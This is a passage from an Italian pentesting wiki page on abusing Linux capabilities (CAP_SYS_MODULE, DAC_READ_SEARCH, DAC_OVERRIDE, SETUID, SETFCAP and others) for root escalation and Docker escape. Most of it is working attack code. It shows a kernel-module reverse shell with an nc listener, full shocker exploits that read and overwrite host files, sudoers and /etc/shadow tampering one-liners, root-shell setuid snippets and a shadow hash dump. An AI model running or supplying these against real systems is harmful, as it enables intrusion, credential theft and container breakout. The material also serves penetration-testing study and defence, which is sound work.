static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Il carattere vuoto prima di ogni parola `make` nel Makefile **deve essere un tabulatore, non degli spazi**!

Esegui `make` per compilarlo.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Infine, avvia `nc` all'interno di una shell e **carica il modulo** da un'altra: catturerai la shell nel processo `nc`:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing SYS_MODULE Capability" di** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Un altro esempio di questa tecnica è disponibile su [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente a un processo di **ignorare i permessi per la lettura dei file e per la lettura e l'esecuzione delle directory**. Il suo utilizzo principale riguarda la ricerca o la lettura dei file. Tuttavia, consente anche a un processo di utilizzare la funzione `open_by_handle_at(2)`, che può accedere a qualsiasi file, inclusi quelli esterni al mount namespace del processo. L'handle utilizzato in `open_by_handle_at(2)` dovrebbe essere un identificatore non trasparente ottenuto tramite `name_to_handle_at(2)`, ma può includere informazioni sensibili come i numeri inode, vulnerabili alla manomissione. Il potenziale di sfruttamento di questa capability, in particolare nel contesto dei container Docker, è stato dimostrato da Sebastian Krahmer con l'exploit shocker, come analizzato [qui](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Ciò significa che puoi** **ignorare i controlli dei permessi di lettura dei file e i controlli dei permessi di lettura/esecuzione delle directory.**

**Esempio con un binario**

Il binario sarà in grado di leggere qualsiasi file. Quindi, se un file come tar dispone di questa capability, sarà in grado di leggere il file shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Esempio con binary2**

In questo caso, supponiamo che il binario **`python`** disponga di questa capability. Per elencare i file di root, puoi eseguire:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
E per leggere un file potresti fare:
```python
print(open("/etc/shadow", "r").read())
```
**Esempio nell'ambiente (Docker breakout)**

Puoi verificare le capabilities abilitate all'interno del container Docker utilizzando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Nel precedente output puoi vedere che la capability **DAC_READ_SEARCH** è abilitata. Di conseguenza, il container può **eseguire il debug dei processi**.

Puoi scoprire come funziona il seguente exploit in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ma in sintesi **CAP_DAC_READ_SEARCH** non ci consente soltanto di attraversare il file system senza controlli dei permessi, ma rimuove anche esplicitamente qualsiasi controllo su _**open_by_handle_at(2)**_ e **potrebbe consentire al nostro processo di accedere a file sensibili aperti da altri processi**.

L'exploit originale che sfrutta questi permessi per leggere file dall'host è disponibile qui: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); quello seguente è una **versione modificata che consente di indicare come primo argomento il file che si desidera leggere e di salvarne il contenuto in un file**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> L'exploit deve trovare un puntatore a qualcosa montato sull'host. L'exploit originale utilizzava il file /.dockerinit, mentre questa versione modificata utilizza /etc/hostname. Se l'exploit non funziona, potrebbe essere necessario impostare un file diverso. Per trovare un file montato sull'host, esegui il comando mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: L'exploit deve trovare un puntatore a qualcosa montato sull'host. L'exploit originale utilizzava il file /.dockerinit, mentre questa versione modificata utilizza...](<../../images/image (407) (1).png>)

**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing DAC_READ_SEARCH Capability" di** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Ciò significa che puoi bypassare i controlli dei permessi di scrittura su qualsiasi file, quindi puoi scrivere su qualsiasi file.**

Esistono molti file che puoi **sovrascrivere per effettuare un'escalation dei privilegi,** [**qui puoi trovare alcune idee**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Esempio con binary**

In questo esempio vim dispone di questa capability, quindi puoi modificare qualsiasi file come _passwd_, _sudoers_ o _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Esempio con binary 2**

In questo esempio il binary **`python`** avrà questa capability. Potresti usare python per sovrascrivere qualsiasi file:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Esempio con environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Puoi verificare le capabilities abilitate all'interno del container Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Innanzitutto leggi la sezione precedente che [**abusa della capability DAC_READ_SEARCH per leggere file arbitrari**](linux-capabilities.md#cap_dac_read_search) dell'host e **compila** l'exploit.\
Quindi, **compila la seguente versione dell'exploit shocker** che consentirà di **scrivere file arbitrari** nel filesystem dell'host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Per effettuare l'**escape** dal container Docker, potresti **download** dei file `/etc/shadow` e `/etc/passwd` dall'host, **add** al loro interno un **new user** e usare **`shocker_write`** per sovrascriverli. Quindi, **access** tramite **ssh**.

**Il codice di questa tecnica è stato copiato dal laboratorio "Abusing DAC_OVERRIDE Capability" di** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Questo significa che è possibile modificare la proprietà di qualsiasi file.**

**Esempio con binary**

Supponiamo che il binary **`python`** disponga di questa capability: puoi **change** il proprietario del file **`shadow`**, **change root password** ed effettuare il privilege escalation:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Oppure con il binario **`ruby`** dotato di questa capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Ciò significa che è possibile modificare i permessi di qualsiasi file.**

**Esempio con un binary**

Se Python dispone di questa capability, puoi modificare i permessi del file shadow, **cambiare la password di root** ed effettuare privilege escalation:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Ciò significa che è possibile impostare l'ID utente effettivo del processo creato.**

**Esempio con un binario**

Se Python dispone di questa **capability**, è possibile abusarne molto facilmente per effettuare un privilege escalation a root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Un altro modo:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Significa che è possibile impostare l'ID effettivo del gruppo del processo creato.**

Ci sono molti file che puoi **sovrascrivere per aumentare i privilegi,** [**puoi trovare alcune idee qui**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Esempio con un binario**

In questo caso dovresti cercare file interessanti che un gruppo può leggere, perché puoi impersonare qualsiasi gruppo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Una volta trovato un file che puoi sfruttare (tramite lettura o scrittura) per eseguire un privilege escalation, puoi **ottenere una shell impersonando il gruppo interessato** con:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In questo caso il gruppo shadow è stato impersonato, quindi puoi leggere il file `/etc/shadow`:
```bash
cat /etc/shadow
```
### Catena combinata: CAP_SETGID + CAP_CHOWN

Quando entrambe le capabilities sono disponibili nello stesso helper, una catena pratica è:

1. Passa l'EGID a `shadow` (o a un altro gruppo privilegiato).
2. Usa `chown` su `/etc/shadow` per impostare il tuo UID mantenendo il gruppo `shadow`.
3. Leggi un hash bersaglio ed esegui crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Questo evita di dover ottenere direttamente i privilegi di root completi ed è comunemente sufficiente per fare pivot tramite il riutilizzo delle credenziali.

Se **docker** è installato, potresti **impersonare** il **gruppo docker** e abusarne per comunicare con il [**docker socket** e fare privilege escalation](#writable-docker-socket).

## CAP_SETFCAP

**Questo significa che è possibile impostare le capabilities su file e processi**

**Esempio con un binario**

Se python dispone di questa **capability**, puoi abusarne molto facilmente per fare privilege escalation a root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Nota che se imposti una nuova capability sul binary con CAP_SETFCAP, perderai questa capability.

Una volta ottenuta la [SETUID capability](linux-capabilities.md#cap_setuid), puoi andare alla relativa sezione per vedere come effettuare una privilege escalation.

**Esempio con environment (Docker breakout)**

Per impostazione predefinita, la capability **CAP_SETFCAP viene assegnata al processo all'interno del container in Docker**. Puoi verificarlo eseguendo qualcosa come:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Questa capability permette di **dare qualsiasi altra capability ai binary**, quindi potremmo pensare di **effettuare l’escaping** dal container **abusando di uno qualsiasi degli altri capability breakout** menzionati in questa pagina.\
Tuttavia, se provi ad assegnare, per esempio, le capability CAP_SYS_ADMIN e CAP_SYS_PTRACE al binary gdb, scoprirai che puoi assegnarle, ma **il binary non sarà più in grado di eseguire dopo questa operazione**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: questo è un **superset limitante per le effective capabilities** che il thread può assumere. È inoltre un superset limitante per le capabilities che possono essere aggiunte all’insieme inheritable da un thread che **non dispone della capability CAP_SETPCAP** nel proprio insieme effective._\
Sembra che le capabilities Permitted limitino quelle che possono essere utilizzate.\
Tuttavia, Docker concede anche **CAP_SETPCAP** per impostazione predefinita, quindi potrebbe essere possibile **impostare nuove capabilities all’interno dell’insieme inheritable**.\
Tuttavia, nella documentazione di questa capability: _CAP_SETPCAP : \[…] **aggiungere qualsiasi capability dall’insieme bounding del thread chiamante al suo insieme inheritable**_.\
Sembra che possiamo aggiungere all’insieme inheritable solo capabilities presenti nell’insieme bounding. Ciò significa che **non possiamo inserire nuove capabilities come CAP_SYS_ADMIN o CAP_SYS_PTRACE nell’insieme inheritable per effettuare privilege escalation**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) fornisce diverse operazioni sensibili, tra cui l’accesso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, la modifica di `mmap_min_addr`, l’accesso alle system call `ioperm(2)` e `iopl(2)` e vari comandi sui dischi. Anche `FIBMAP ioctl(2)` è abilitato tramite questa capability, causando problemi in [passato](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Come indicato nella man page, ciò consente inoltre al titolare di `perform a range of device-specific operations on other devices`.

Questo può essere utile per la **privilege escalation** e il **Docker breakout.**

## CAP_KILL

**Ciò significa che è possibile terminare qualsiasi processo.**

**Esempio con un binary**

Supponiamo che il binary **`python`** disponga di questa capability. Se fosse inoltre possibile **modificare la configurazione di un service o socket** (o qualsiasi file di configurazione relativo a un service), si potrebbe inserire una backdoor e quindi terminare il processo relativo a quel service, aspettando che il nuovo file di configurazione venga eseguito con la backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc con kill**

Se disponi delle capabilities kill e c'è un **node program in esecuzione come root** (o come un utente diverso)potresti probabilmente **inviargli** il **signal SIGUSR1** e fare in modo che **apra il node debugger**, a cui puoi connetterti.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Questo significa che è possibile mettersi in ascolto su qualsiasi porta (anche su quelle privilegiate).** Non è possibile eseguire un'escalation dei privilegi direttamente con questa capability.

**Esempio con un binario**

Se **`python`** dispone di questa capability, potrà mettersi in ascolto su qualsiasi porta e persino connettersi da essa a qualsiasi altra porta (alcuni servizi richiedono connessioni provenienti da porte con privilegi specifici)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

La capability [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) consente ai processi di **creare socket RAW e PACKET**, permettendo loro di generare e inviare pacchetti di rete arbitrari. Questo può comportare rischi per la sicurezza negli ambienti containerizzati, come lo spoofing dei pacchetti, l'iniezione del traffico e l'elusione dei controlli di accesso alla rete. Soggetti malevoli potrebbero sfruttare questa capability per interferire con il routing dei container o compromettere la sicurezza della rete dell'host, soprattutto in assenza di adeguate protezioni firewall. Inoltre, **CAP_NET_RAW** è fondamentale per i container privilegiati, poiché consente di supportare operazioni come il ping tramite richieste ICMP RAW.

**Ciò significa che è possibile sniffare il traffico.** Non è possibile effettuare direttamente un'escalation dei privilegi con questa capability.

**Esempio con un binario**

Se il binario **`tcpdump`** dispone di questa capability, sarà possibile utilizzarlo per catturare informazioni di rete.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Nota che, se l'**ambiente** fornisce questa capability, potresti anche usare **`tcpdump`** per sniffare il traffico.

**Esempio con il binario 2**

Il seguente esempio è codice **`python2`** che può essere utile per intercettare il traffico dell'interfaccia "**lo**" (**localhost**). Il codice proviene dal lab "_The Basics: CAP-NET_BIND + NET_RAW_" di [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

La capability [**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) concede al titolare la possibilità di **modificare le configurazioni di rete**, incluse le impostazioni del firewall, le tabelle di routing, i permessi dei socket e le impostazioni delle interfacce di rete all'interno dei network namespaces esposti. Consente inoltre di attivare la **promiscuous mode** sulle interfacce di rete, permettendo il packet sniffing tra i namespaces.

**Esempio con un binario**

Supponiamo che il **python binary** disponga di queste capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Questo significa che è possibile modificare gli attributi degli inode.** Non puoi effettuare privilege escalation direttamente con questa capability.

**Esempio con binary**

Se trovi che un file è immutabile e python dispone di questa capability, puoi **rimuovere l'attributo immutable e rendere il file modificabile:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Tieni presente che di solito questo attributo immutable viene impostato e rimosso usando:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) abilita l'esecuzione della system call `chroot(2)`, che può potenzialmente consentire l'escape dagli ambienti `chroot(2)` tramite vulnerabilità note:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) non consente solo l'esecuzione della system call `reboot(2)` per il riavvio del sistema, inclusi comandi specifici come `LINUX_REBOOT_CMD_RESTART2` adattati a determinate piattaforme hardware, ma abilita anche l'uso di `kexec_load(2)` e, a partire da Linux 3.17, di `kexec_file_load(2)` per caricare rispettivamente nuovi crash kernel o crash kernel firmati.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) è stata separata dalla più ampia **CAP_SYS_ADMIN** in Linux 2.6.37, concedendo specificamente la possibilità di usare la chiamata `syslog(2)`. Questa capability consente di visualizzare gli indirizzi del kernel tramite `/proc` e interfacce simili quando l'impostazione `kptr_restrict` è 1, controllando l'esposizione degli indirizzi del kernel. A partire da Linux 2.6.39, il valore predefinito di `kptr_restrict` è 0, il che significa che gli indirizzi del kernel sono esposti, sebbene molte distribuzioni lo impostino su 1 (nasconde gli indirizzi tranne che per uid 0) o 2 (nasconde sempre gli indirizzi) per motivi di sicurezza.

Inoltre, **CAP_SYSLOG** consente di accedere all'output di `dmesg` quando `dmesg_restrict` è impostato su 1. Nonostante queste modifiche, **CAP_SYS_ADMIN** mantiene la possibilità di eseguire operazioni `syslog` per motivi storici.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) estende la funzionalità della system call `mknod` oltre la creazione di file normali, FIFO (named pipe) o UNIX domain socket. Consente specificamente la creazione di special files, tra cui:

- **S_IFCHR**: Character special files, ovvero dispositivi come i terminali.
- **S_IFBLK**: Block special files, ovvero dispositivi come i dischi.

Questa capability è essenziale per i processi che devono poter creare device files, facilitando l'interazione diretta con l'hardware tramite character o block devices.

